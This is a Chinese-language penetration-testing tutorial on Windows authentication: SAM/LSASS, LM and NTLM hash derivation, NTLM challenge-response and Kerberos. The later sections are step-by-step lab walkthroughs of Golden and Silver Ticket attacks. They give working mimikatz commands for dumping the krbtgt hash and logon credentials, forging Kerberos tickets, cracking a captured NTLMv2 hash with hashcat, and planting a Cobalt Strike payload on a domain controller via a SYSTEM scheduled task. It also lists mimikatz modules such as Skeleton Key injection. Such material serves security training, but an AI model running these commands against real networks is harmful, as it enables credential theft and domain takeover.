# Windows认证和密码抓取概述

## Windows认证  

1. 本地认证 
2. 网络认证 
3. 域认证

## 密码抓取

1. SAM文件 
2. Lsass.exe

# Windwso本地认证之NTML哈希和LM哈希

## 本地认证的流程

Windows的登陆密码是储存在系统本地的SAM文件中的，在登陆Windows的时候，系统会将用户输入的密码与 SAM文件中的密码进行对比，如果相同，则认证成功 

SAM文件是位于 `%SystemRoot%\system32\config\` 目录下的，用于储存本地所有用户的凭证信息，但是这并不代表 着你可以随意去查看系统密码。

![image-20230126152644850](https://image.201068.xyz/assets/image-20230126152644850.png)

Windows本地认证流程如下：

![image-20230130162947177](https://image.201068.xyz/assets/image-20230130162947177.png)

首先，用户注销、重启、锁屏后，操作系统会让winlogon.exe显示登陆界面，也就是输入框界面，接收用户的输入 信息后，将密码交给lsass进程，这个过程中会存一份明文密码，将明文密码加密成NTLM Hash，对SAM数据库进 行比较认证 Windows Logon Process（即winlogon.exe）：是Windows NT 用户登陆程序，用于管理用户登陆和退出 LSASS：用于微软Windows系统的安全机制，它用于本地安全和登陆策略 本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对，我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的

## LM和NTML哈希

Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中,用户信息存储在`ntds.dit`中,加 密后为散列值。 Windows操作系统中的密码一般由两部分组成,一部分为 LM Hash,另一部分为NTLMHash。在 Windows操作系统中,Hash的结构通常如下

```
username:RID:LM‐HASH:NT‐HASH
```

LM Hash的全名为"LAN Manager Hash",是微软为了提高 Windows操作系统的安全性而采 用的散列加密算法,其本 质是DES加密。尽管 LM Hash较容易被破解,但为了保证系统的兼容性, Windows只是将LM Hash禁用了(从 Windows vista和 Windows Server2008版本开始, Windows操作系统默认禁用 LM Hash)。 LM Hash明文密码被 限定在14位以内,也就是说,如果要停止使用 LM Hash,将用 户的密码设置为14位以上即可。如果 LM Hash被禁用了, 攻击者通过工具抓取的 LM Hash通常 为“ad3b435b51404eead3b435b51404ee”(表示 LM Hash为空值或被禁用) NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。 NTLM Hash 是基于MD4加密算 username:RID:LM‐HASH:NT‐HASH 法进行加密的。个人版从 Windows vista以后,服务器版从 Windows Server 2003以后, Windows操作系统的认证方 式均为 NTLM Hash 

为了解决LM加密和身份验证方案中固有的安全弱点，Microsoft 于1993年在Windows NT 3.1中引入了NTLM协 议。下面是各个版本对LM和NTLM的支持。

![image-20230130163118145](https://image.201068.xyz/assets/image-20230130163118145.png)

## LM Hash原理

1、将明文口令转换为其*大写*形式 假设这里以明文`Admin@123`为例，转换为大写格式为：`ADMIN@123` 

2、 将字 符串大写后转换为*16进制字符串转换*后为 `41 44 4D 49 4E 40 31 32 33` 

3、密码不足*14字节*要求用*0补全*， 1Byte=8bit,上面的16进制字符串共9个字节,还差5个字节 我么使用 00 00 00 00 00 补全为 41 44 4D 49 4E 40 31 32 33 00 00 00 00 00 

4、将上述编码分成*2组7字节*

```
41 44 4D 49 4E 40 31 第一组
32 33 00 00 00 00 00 第二组
```

5、将每一组7字节的十六进制转换为*二进制*，每7bit一组*末尾加0*，再转换成*十六进制*组成得到2组8字节的编码 

第 一组

```
16进制：41 44 4D 49 4E 40 31
转换为二进制：01000001010001000100110101001001010011100100000000110001
七个为一组末尾补
01000000
10100010
00010010
10101000
10010100
01110010
00000000
01100010
合并后为0100000010100010000100101010100010010100011100100000000001100010
在转换为16进制：40A212A894720062
```

第二组

```
16进制：32 33 00 00 00 00 00
转换为二进制：00110010001100110000000000000000000000000000000000000000
七个为一组末尾补
00110010
00011000
11000000
00000000
00000000
00000000
00000000
00000000
合并后为0011001000011000110000000000000000000000000000000000000000000000
在转换为16进制：3218C00000000000
```

6、将以上步骤得到的两组8字节编码，分别*作为DES加密key*为魔术字符串 `KGS!@#$%` 进行加密 KGS!@#$%的16进 制为 `4B47532140232425`

```
第一组：6F08D7B306B1DAD4
第二组：B75E0C8D76954A50
```

![image-20230130163318739](https://image.201068.xyz/assets/image-20230130163318739.png)

7、最终结果拼接即可`6F08D7B306B1DAD4B75E0C8D76954A50`

## NTLM Hash原理

将明文口令*转换成十六进制*的格式 如：Admin@123 转换成*Unicode格式*，即在每个字节之后添加0x00

```
Admin@123转16进制 41646D696E40313233
添加00：410064006D0069006E004000310032003300
```

对Unicode字符串作*MD4加密*，生成32位的十六进制数字串 `570a9a65db8fba761c1008a51d4c95ab`

![image-20230130163437018](https://image.201068.xyz/assets/image-20230130163437018.png)

# Windows网络认证之基于挑战响应认证的NTLM 协议

## 网络认证NTLM协议简介

在平时的测试中，经常会碰到处于工作组的计算机，处于工作组的计算机之间是无法建立一个可信的信托机构的， 只能是点对点进行信息的传输。举个例子就是，主机A想要访问主机B上的资源，就要向主机B发送一个存在于主机 B上的一个账户，主机B接收以后会在本地进行验证，如果验证成功，才会允许主机A进行相应的访问。

NTLM 协议是一种基于 `挑战（Chalenge）/响应（Response）` 认证机制，仅支持Windows的网络认证协议。

 它主要分为协商、质询和验证三个步骤：

```
协商，这个是为了解决历史遗留问题，也就是为了向下兼容，双方先确定一下传输协议的版本等各种信息。
质询，这一步便是Chalenge/Response认证机制的关键之处，下面会介绍这里的步骤。
验证，对质询的最后结果进行一个验证，验证通过后，即允许访问资源
```

## 认证流程

### 认证成功

1、首先，client会向server发送一个username，这个username是存在于server上的一个用户

![image-20230130163927758](https://image.201068.xyz/assets/image-20230130163927758.png)

2、首先会在本地查询是否存在这样的一个用户，如果存在，将会生成一个16位的随机字符，即*Chalenge*，然后用 查询到的这个user的*NTLM hash*对Chalenge进行加密，生成Chalenge1，将Chalenge1存储在本地，并将 Chalenge传给client。

![image-20230130163943060](https://image.201068.xyz/assets/image-20230130163943060.png)

3、当client接收到Chalenge时，将发送的username所对应的NTLM hash对Chalenge进行加密即*Response*，并 Response发送给server。

![image-20230130164004463](https://image.201068.xyz/assets/image-20230130164004463.png)

4、server在收到Response后，将其与Chalenge1进行*比较*，如果相同，则验证成功

![image-20230130164024407](https://image.201068.xyz/assets/image-20230130164024407.png)

### 认证失败

1、首先，client会向server发送一个username，这个username是存在于server上的一个用户

![image-20230130164044712](https://image.201068.xyz/assets/image-20230130164044712.png)

2、当server接收到这个信息时，首先会在本地查询是否存在这样的一个用户，如果不存在，则直接返回认证失败

![image-20230130164100718](https://image.201068.xyz/assets/image-20230130164100718.png)

## NTLM协议v1和v2区别

NTLM V2协议，NTLM v1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是 NTLM Hash，

```
NTLM v1的Challenge有8位，NTLM v1的主要加密算法是DES
NTLM v2的Challenge为16位；NTLM v2的主要加密算法是HMAC‐MD5。
```

## 抓包分析

1、实验环境如下

| 机器名称                     | IP地址         | 账号密码      |
| ---------------------------- | -------------- | ------------- |
| 实验机器（windows 10）       | 192.168.41.132 | 自己的        |
| 靶机（windows server 2008 ） | 192.168.41.130 | kkk/Admin@123 |

2、windows 10 上 已经安装了 wireshark

![image-20230130164331183](https://image.201068.xyz/assets/image-20230130164331183.png)

3、使用如下命令进行远程连接，并且使用wireshark 包

```
net use \\192.168.70.14 /u:mb 123456
```

![image-20230130164403344](https://image.201068.xyz/assets/image-20230130164403344.png)

4、前5个数据包中前四条时协商，第五个是认证的第一个数据包

![image-20230130164417314](https://image.201068.xyz/assets/image-20230130164417314.png)

5、第6个数据包就是返回chalenge挑战值

![image-20230130164437933](https://image.201068.xyz/assets/image-20230130164437933.png)

分析该数据包得到chalenge值 `53fb7eb8d40cc777`

![image-20230130164503537](https://image.201068.xyz/assets/image-20230130164503537.png)

6、第7个数据包就是返回response的数据包

rsponse数据如下：

```
3d00ee8a5618f85651098b8005883d5c0101000000000000f790f7af9b92d8019cba65f5e39a1ea90000000002000e00
42004d002d00320030003000380001000e0042004d002d00320030003000380004000e0042004d002d00320030003000
380003000e0042004d002d00320030003000380007000800f790f7af9b92d80106000400020000000800300030000000
0000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391df48f0fad1ce073380a001000
000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e003400
31002e003100330030000000000000000000
```

![image-20230130164546629](https://image.201068.xyz/assets/image-20230130164546629.png)

7、接下来得到NTLMv2 数据，NTLMv2格式如下：

```
username::domain:challenge:HMAC‐MD5:blob
```

介绍如下：

```
username：对应数据包中 user name
domain:对应数据包中的 Domain name
HMAC‐MD5：对应数据包中的NTProofStr
blob：数据库包中rsponse去掉HMAC‐MD5的值
```

![image-20230130164632480](https://image.201068.xyz/assets/image-20230130164632480.png)

8、最终的到HTLNv2如下：

```
kkk:::53fb7eb8d40cc777:3d00ee8a5618f85651098b8005883d5c:0101000000000000f790f7af9b92d8019cba65f5
e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e00
42004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d80106000400
0200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391d
f48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f00310039003200
2e003100360038002e00340031002e003100330030000000000000000000
```

9、使用hashcat 破解密码

```
hashcat ‐m 5600
kkk:::53fb7eb8d40cc777:3d00ee8a5618f85651098b8005883d5c:0101000000000000f790f7af9b92d8019cba65f5
e39a1ea90000000002000e0042004d002d00320030003000380001000e0042004d002d00320030003000380004000e00
42004d002d00320030003000380003000e0042004d002d00320030003000380007000800f790f7af9b92d80106000400
0200000008003000300000000000000001000000002000009906b326309f0ba76eb46b2271795e5d12df73e87035391d
f48f0fad1ce073380a001000000000000000000000000000000000000900260063006900660073002f00310039003200
2e003100360038002e00340031002e003100330030000000000000000000 1.txt ‐‐force
```

上面的1.txt是我自己的密码字典，你们用自己的 

10、使用hashcat破解得到密码

![image-20230130164736336](https://image.201068.xyz/assets/image-20230130164736336.png)

# Windows域认证之Kerberos协议认证

## 什么是Kerberos协议

Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该 认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并 假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三 方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的

## Kerberos协议的组成角色

在古希腊神话故事中，kerberos是一只具有三颗头颅的地狱恶犬，他守护在地狱之外，能够识别所有经此路过的亡 灵，防止活着的入侵者闯入地狱。

![image-20230130164907797](https://image.201068.xyz/assets/image-20230130164907797.png)

kerberos协议中也存在三个角色，分别是

```
客户端（client）：发送请求的一方
服务端（Server）：接收请求的一方
密钥分发中心（Key Distribution Center，KDC），而密钥分发中心一般又分为两部分，分别是：
AS（Authentication Server）：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据
授予票据）
TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务
授予票据（Ticket）
```

## Kerberos认证的简单流程

举个例子：

 A现在想要去访问B完成一个任务。但是AB两人之间是从来没有见过面的，他们只知道对方的名字叫A，B。此时如 果A直接去找B告诉B我就是A，那么B是有理由不相信A的，B同理也得不到A的认可，他们陷入了一个无 法证明我 就是我的困境。 

于是他们就想到了一个办法，AB找到了一个他俩共同信任的人C，且这个C既认识A又认识B，所以只要C告诉B，这 个A确实就是真正的A那么B就会信任这个A，同理B经过C的认可后，A也会相信B的身份。此后，A在访问B之前会 先去找C，C会交给A一个凭证，代表此时的A已经得到了C的认证，这时A拿着凭证再去找B，便可以得到B的确认 了。 

在举个例子：

 我们去动物园，动物园不认识你不让你进，你也怕进门后不是动物园，所以就很尴尬

![image-20230130165029831](https://image.201068.xyz/assets/image-20230130165029831.png)

如何解决呢？我们建立一个售票窗口，只要售票处认识你和动物园，你和动物园之间就可以相互信任。

![image-20230130165050265](https://image.201068.xyz/assets/image-20230130165050265.png)

```
人：代表客户端
动物园：代表服务端
售票处：代表KDC
```

所以整个kerberos认证流程可以简化描述如下： 客户端在访问每个想要访问的网络服务时，他需要携带一个专门 用于访问该服务并且能够证明自己身份的票据，当服务端收到了该票据他才能认定客户端身份正确，向客户端提供 服务。所以整个认证流程可简化为两大步：

```
1、客户端向KDC请求获取想要访问的目标服务的服务授予票据（Ticket）；
2、客户端拿着从KDC获取的服务授予票据（Ticket）访问相应的网络服务；
```

![image-20230130165126649](https://image.201068.xyz/assets/image-20230130165126649.png)

## Kerberos认证完成流程

在上述的流程中，其实还有一个问题，那就是 

1.KDC怎么知道你（客户端）就是真正的客户端？凭什么给你发放服务授予票据（Ticket）呢？

我们以去动物园为例，售票处凭什么给你买票，你如果是一个逃犯怎么办？其实买票的过程我们可以分为两步第一 才步是你拿着身份证去验证，第二步身份验证通过了才会给你票

![image-20230130165337983](https://image.201068.xyz/assets/image-20230130165337983.png)

```
人：代表客户端
动物园：代表服务端
售票处：KDC
身份校验人员:AS，负责验证用户身份的合法性，和给用户一个可以买票的票（TGT）
卖票人员：TGS，负责客户端访问服务端时所需的服务授予票据的单位
```

所以kerberos通信可以分为3步，我们逐步详解

## 通信第一步-客户端和AS进行通信 

为了获得能够用来访问服务端服务的票据，客户端首先需要来到KDC获得服务授予票据（Ticket）。由于客户端是 第一次访问KDC，此时KDC也不确定该客户端的身份，所以第一次通信的目的为KDC认证客户端身份，确认客户端 是一个可靠且拥有访问KDC权限的客户端，

![image-20230130165424492](https://image.201068.xyz/assets/image-20230130165424492.png)

1、客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳； 2、KDC当中的AS（Authentication Server）接收请求（AS是KDC中专门用来认证客户端身份的认证服务器）后去 kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可 靠性； 3、如果没有该用户名，认证失败，服务结束；如果存在该用户名，则AS认证中心便认为用户存在，此时便会返回响应给 客户端，其中包含两部分内容： 3.1、第一部分内容称为TGT，他叫做票据授予票据，客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问 网络服务所需的Ticket（服务授予票据），TGT中包含的内容有kerberos数据库中存在的该客户端的Name，IP，当前时 间戳，客户端即将访问的TGS的Name，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。 整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情 况。 3.2第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK),客 户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿 到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密 钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。 至此，第一次通信完成。

## 通信第二步-客户端和TGS进行通信

此时的客户端收到了来自KDC（其实是AS）的响应，并获取到了其中的两部分内容。此时客户端会用自己的密钥将 第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。首先 他会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于5分钟，如果大于五分钟则认为该AS是 伪造的，认证至此失败。如果时间戳合理，客户端便准备向TGS发起请求

![image-20230130165505537](https://image.201068.xyz/assets/image-20230130165505537.png)

```
客户端行为：
1、客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳；
2、客户端将自己想要访问的Server服务以明文的方式发送给KDC；
3、客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；
TGS行为：
1、此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的Server服务IP查
看当前kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束，。如果存在，继续接下来的认
证。
2、TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过AS认证过后并记录的用户信息，一把Session_KEY即
CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。
3、如果时延正常，则TGS会使用CT_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的
用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。
4、此时KDC将返回响应给客户端，响应内容包括：
第一部分：用于客户端访问网络服务的使用Server密码加密的ST（Servre Ticket），其中包括客户端的Name，
IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信CS_SK（Session
Key）。
第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS
已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以
自己解密的。
至此，第二次通信完成。
```

## 通信第三步-客户端和服务端进行通信

此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中 的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请 求。

![image-20230130165546042](https://image.201068.xyz/assets/image-20230130165546042.png)

```
客户端：
1、客户端使用CS_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）
作为第二部分内容都发送给服务端。
服务端：
1、服务器此时收到了来自客户端的请求，他会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时
间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端
信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的
具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户
端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会
使用数字证书证明自己身份）。
至此，第三次通信完成。此时也代表着整个kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的
进行整个网络通信了。
```

总体流程如下

![image-20230130165633262](https://image.201068.xyz/assets/image-20230130165633262.png)

# Golden Ticket黄金票据制作原理及利用方式

## Krbtgt账户介绍

krbtgt用户，是系统在创建域时自动生成的一个帐号，其作用是密钥分发中心的服务账号，其密码是系统随机生成 的，无法登录主机

![image-20230202145132921](https://image.201068.xyz/assets/image-20230202145132921.png)

## 黄金票据原理

TGT=Krbtgt的NTLM hash 加密 

1、Kerberos中的TGT和Logon Session Key（CT_SK）是AS返回的 ，TGT它是由Krbtgt加密和签名的 ,krbtgt的 NTLM Hash又是固定的,而CT_SK并不会保存在KDC中。

 2、所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key（CT_SK）。

 3、Client与TGS的交互中，而已有了金票后（TGT）,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修 改。

 当我们获得域控的控制权限后，有可能获取域内所有用户的hash，和krbtgt的hash。这时，由于一些原因导致我 们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且krbtgt的密码没有更改，此时我们可以利用 krbtgt用户的ntlm hash制作黄金票据伪造TGT，重新获取域控的管理权限。

![image-20230202145306836](https://image.201068.xyz/assets/image-20230202145306836.png)

我们在以去动物园为例，当我们去买票的时候，我么首先第一步是去身份认证管理员那里认证身份

![image-20230202145323135](https://image.201068.xyz/assets/image-20230202145323135.png)

## 实验内容

### 实验环境

| 实验机器                        | IP地址        |
| ------------------------------- | ------------- |
| windows server 2012 （域控）    | 192.168.41.10 |
| windows server 2008（域内成员） | 192.168.41.20 |

### 实验前提

1、已经控制了域名并且使用域管理员登录或者提权的system 

如果域管理员发现了你控制了域控机器，把你的后门删除了，那么就不能继续控制域控了，这个时候当我们可以伪 造TGT重新获得域控的权限 

条件如下：

```
1、域名称
2、域的SID值
3、域的KRBTGT账号的HASH
4、伪造任意用户名
（获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）
```

### 实验步骤

1、目前已经控制了域控和域内机器

![image-20230202145547500](https://image.201068.xyz/assets/image-20230202145547500.png)

2、获取关键信息

```
shell whoami /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)
shell net config workstation 查看域
```

![image-20230202145617619](https://image.201068.xyz/assets/image-20230202145617619.png)

得到 域为：`hack.com SID:S-1-5-21-2716900768-72748719-3475352185`

3、使用mimikatz导出KRBTGT的ntlm hash

```
mimikatz lsadump::dcsync /domain:hack.com /user:krbtgt
```

![image-20230202145716694](https://image.201068.xyz/assets/image-20230202145716694.png)

得到 `b78ec645cc2d18290c5690ele76e827f`

b78ec645cc2d18290c5690e1e76e827f 

lsadump::dcsync /domain:hack.com /user:krbtgt

4、这个时候突然域控下线了，管理员发现的你在控制，把后门清理了

![image-20230202145823056](https://image.201068.xyz/assets/image-20230202145823056.png)

5、因为之前已经记录了关键信息，我们现在就可以伪造任意用户访问域控，windows 2008机器必须是域内用户或 者system用户

```
mimikatz kerberos::tgt 查票
mimikatz kerberos::purge 清票
```

![image-20230202145853051](https://image.201068.xyz/assets/image-20230202145853051.png)

6、使用dir 远程访问域控

```
shell dir \\dc.hack.com\c$
```

![image-20230202145951465](https://image.201068.xyz/assets/image-20230202145951465.png)

7、使用计划任务上线cs

copy恶意文件到域控

```
shell copy c:\users\administrator\desktop\artifact.exe \\dc.hack.com\c$
```

![image-20230202150031471](https://image.201068.xyz/assets/image-20230202150031471.png)

设置计划任务到域控

```
shell schtasks /create /s dc.hack.com /tn test /sc onstart /tr c:\artifact.exe /ru system /f
```

![image-20230202150059194](https://image.201068.xyz/assets/image-20230202150059194.png)

```
shell schtasks /run /s dc.hack.com /i /tn "test"
```

![image-20230202150130353](https://image.201068.xyz/assets/image-20230202150130353.png)

域控重新上线

![image-20230202150148210](https://image.201068.xyz/assets/image-20230202150148210.png)

# Silver Ticket白银票据制作原理及利用方式

## 服务账号介绍

服务账号就是计算机名字+$用来管理服务的账号

## 白银票据原理

如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。 在Kerberos认证的第三部，Client带着ST和 Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST, 从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问 server上的指定服务了。所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的 门票只对部分服务起作用。

![image-20230202172747936](https://image.201068.xyz/assets/image-20230202172747936.png)

我们以去动物举例

![image-20230202172809787](https://image.201068.xyz/assets/image-20230202172809787.png)

## 实验内容

### 实验环境

| 实验机器                        | IP地址        |
| ------------------------------- | ------------- |
| windows server 2012 （域控）    | 192.168.41.10 |
| windows server 2008（域内成员） | 192.168.41.20 |
| windows server 2003（域内成员） | 192.168.41.30 |

### 实验前提

1、已经控制了域控并且使用域管理员登录或者提权的system 

我们的目的是去访问windows server 2003 的机器 

条件如下：

```
1.域名
2.域sid
3.目标服务器名
4.可利用的服务
5.服务账号的NTML HASH
6.需要伪造的用户名
```

### 实验步骤 

#### 控制域控

##### 1、获取基本信息

```
shell whoami /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)
shell net config workstation 查看域
```

![image-20230202173041308](https://image.201068.xyz/assets/image-20230202173041308.png)

得到 域为：`hack.com SID:S-1-5-21-2716900768-72748719-3475352185`

##### 2、获取服务账号的ntlm hash值

```
mimikatz sekurlsa::logonpasswords
```

![image-20230202173120289](https://image.201068.xyz/assets/image-20230202173120289.png)

得到 hash `26a703eba507e848825615316bc880a1`

##### 3、伪造票据（CIFS共享服务）

```
mimikatz kerberos::tgt 查票
mimikatz kerberos::purge 清票
shell klist 查票
shell klist purge 清票

mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185 /target:dc.hack.com /service:cifs /rc4:26a703eba507e848825615316bc880a1 /user:abcd /ptt
```

![image-20230202173232588](https://image.201068.xyz/assets/image-20230202173232588.png)

##### 4、访问域控

```
shell dir \\dc.hack.com\c$
```

![image-20230202173258435](https://image.201068.xyz/assets/image-20230202173258435.png)

##### 5、伪造票据（LDAP共享服务）

```
mimikatz kerberos::tgt 查票
mimikatz kerberos::purge 清票
shell klist 查票
shell klist purge 清票

mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185
/target:dc.hack.com /service:LDAP /rc4:26a703eba507e848825615316bc880a1 /user:abcd /ptt
```

##### 6、查询域控的krgtgt

```
mimikatz lsadump::dcsync /dc:dc.hack.com /domain:hack.com /user:krbtgt
```

![image-20230202173353714](https://image.201068.xyz/assets/image-20230202173353714.png)

##### 7、再使用一次黄金票据使域控上线

```
krbtgt的ntml hash
域控管理员的sid
域名称
```



#### 控制2003

##### 1、获取基本信息

```
shell whoami /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)
shell net config workstation 查看域
```

![image-20230202173434780](https://image.201068.xyz/assets/image-20230202173434780.png)

得到 域为：`hack.com SID:S-1-5-21-2716900768-72748719-3475352185`

##### 2、获取服务账号的ntlm hash值

```
mimikatz sekurlsa::logonpasswords
```

![image-20230202173505598](https://image.201068.xyz/assets/image-20230202173505598.png)

得到 hash `1a4c65ba0926944b4066f6fcdcf05bbd`

##### 3、伪造票据（CIFS共享服务）

```
mimikatz kerberos::tgt 查票
mimikatz kerberos::purge 清票
shell klist 查票
shell klist purge 清票

mimikatz kerberos::golden /domain:hack.com /sid:S‐1‐5‐21‐2716900768‐72748719‐3475352185 /target:PC‐2003.hack.com /service:cifs /rc4:1a4c65ba0926944b4066f6fcdcf05bbd /user:abc /ptt
```

![image-20230202173541989](https://image.201068.xyz/assets/image-20230202173541989.png)

##### 4、访问2003

```
shell dir \\pc‐2003.hack.com\c$
```

![image-20230202173610732](https://image.201068.xyz/assets/image-20230202173610732.png)

# Mimikatz介绍和离线读取SAM文件抓取密码

## Mimikatz介绍

Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，但由于其功能强大，能够直接读取 WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具，mimikatz可以从内存中提 取明文密码、哈希、PIN 码和 kerberos 票证。 mimikatz 还可以执行哈希传递、票证传递或构建黄金票证

项目地址 https://github.com/gentilkiwi/mimikatz/

### 模块命令如下：

```
cls： 清屏
standard： 标准模块，基本命令
crypto： 加密相关模块
sekurlsa： 与证书相关的模块
kerberos： kerberos模块
privilege： 提权相关模块
process： 进程相关模块
serivce： 服务相关模块
lsadump： LsaDump模块
ts： 终端服务器模块
event： 事件模块
misc： 杂项模块
token： 令牌操作模块
vault： Windows 、证书模块
minesweeper：Mine Sweeper模块
net：
dpapi： DPAPI模块（通过API或RAW访问）[数据保护应用程序编程接口]
busylight： BusyLight Module
sysenv： 系统环境值模块
sid： 安全标识符模块
iis： IIS XML配置模块
rpc： mimikatz的RPC控制
sr98： 用于SR98设备和T5577目标的RF模块
rdm： RDM（830AL）器件的射频模块
acr： ACR模块
version： 查看版本
exit： 退出
```

### 常用命令

```
CRYPTO::Certificates – 列出/导出凭证。
KERBEROS::Golden – 创建黄金票证/白银票证/信任票证。
KERBEROS::List – 列出在用户的内存中所有用户的票证（TGT 和 TGS）。
KERBEROS::PTT – 票证传递。
LSADUMP::DCSync – 向 DC 发起同步一个对象（获取帐户的密码数据）的质询。

LSADUMP::LSA – 向 LSA Server 质询检索 SAM/AD 的数据（正常或未打补丁的情况下）。可以从 DC 或者是一个lsass.dmp的转储文件中
导出所有的Active Directory 域凭证数据。同样也可以获取指定帐户的凭证，如 krbtgt 帐户，使用 /name 参数，
如：“/name:krbtgt”。
LSADUMP::SAM ‐ 获取 SysKey 来解密 SAM 的项目数据（从注册表或者 hive 中导出）SAM 选项。可以连接到本地安
全帐户管理器（SAM）
数据库中并能转储本地帐户的凭证。可以用来转储在 Windows 计算机上的所有的本地凭据。
LSADUMP::Trust ‐ 向 LSA Server 质询来获取信任的认证信息（正常或未打补丁的情况下）为所有相关的受信的域或
林转储信任密钥（密码）
MISC::AddSid – 将用户帐户添加到 SID 历史记录。第一个值是目标帐户，第二值是帐户/组名（可以是多个或 SID
）。
MISC::MemSSP – 注入恶意的 Wndows SSP 来记录本地身份验证凭据。
MISC::Skeleton – 在 DC 中注入万能钥匙（Skeleton Key） 到 LSASS 进程中。这使得所有用户所。
使用的万能钥匙修补 DC 使用 “主密码” （又名万能钥匙）以及他们自己通常使用的密码进行身份验证。
PRIVILEGE::Debug – 获得 Debug 权限（很多 Mimikatz 命令需要 Debug 权限或本地 SYSTEM 权限）。
SEKURLSA::Ekeys – 列出 Kerberos 密钥
SEKURLSA::Kerberos – 列出所有已通过认证的用户的 Kerberos 凭证（包括服务帐户和计算机帐户）。
SEKURLSA::Krbtgt – 获取域中 Kerberos 服务帐户（KRBTGT）的密码数据。
SEKURLSA::LogonPasswords – 列出所有可用的提供者的凭据。这个命令通常会显示最近登录过的用户和最近登录过的
计算机的凭证。
SEKURLSA::Pth – Hash 传递 和 Key 传递（注：Over‐Pass‐the‐Hash 的实际过程就是传递了相关的 Key(s)）。

SEKURLSA::Tickets – 列出最近所有已经过身份验证的用户的可用的 Kerberos 票证，包括使用用户帐户的上下文运
行的服务和本地计算机
在AD 中的计算机帐户。与 kerberos::list 不同的是 sekurlsa 使用内存读取的方式，它不会受到密钥导出的限制。

TOKEN::List – 列出系统中的所有令牌。
TOKEN::Elevate – 假冒令牌。用于提升权限至 SYSTEM 权限（默认情况下）或者是发现计算机中的域管理员的令牌。

TOKEN::Elevate /domainadmin – 假冒一个拥有域管理员凭证的令牌。
```

